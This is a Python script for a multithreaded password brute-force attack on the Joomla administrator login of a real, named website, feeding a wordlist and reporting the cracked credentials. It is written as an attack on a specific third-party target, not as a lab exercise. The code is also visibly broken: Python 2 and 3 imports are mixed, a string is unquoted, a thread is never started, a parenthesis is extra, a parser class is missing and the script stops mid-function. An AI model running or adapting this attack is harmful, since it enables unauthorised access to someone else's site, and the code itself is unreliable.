import urllib.request
import urllib.parse
import threading
import sys
import queue
import http.cookiejar

from HTMLParser import HTMLParser


user_thread = 10
username = admin
wordlist_file = '/home/wsrtk/Downloads/all.txt'
resume = None

target_url = 'https://agh.iaeste.pl/administrator/index.php'
target_post = target_url

username_field = 'username'
password_field = 'passwd'

success_check = 'Administracja - panel sterowania'


class Bruter(object):

    def __init__(self, username, words):

        self.username = username
        self.password_q = words
        self.found = False

        print('Finished configuration for %s' % username)


    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start

    
    def web_bruter(self):

        while not self.password_q.empty() and not self.found:

            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar('cookies')
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print('Checking: %s : %s (left: %d)' % (self.username, brute, self.password_q.qsize()))

            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags)

            login_response = opener.open(target_post, login_data))

            login_result = login_response.read()

            if success_check in login_result:

                self.found = True

                print('[*] Attack successful')
                print('[*] Username: %s' % username)
                print('[*] Password: %s' % brute)
                print('[*] Waiting for other processess to finish...')
                
            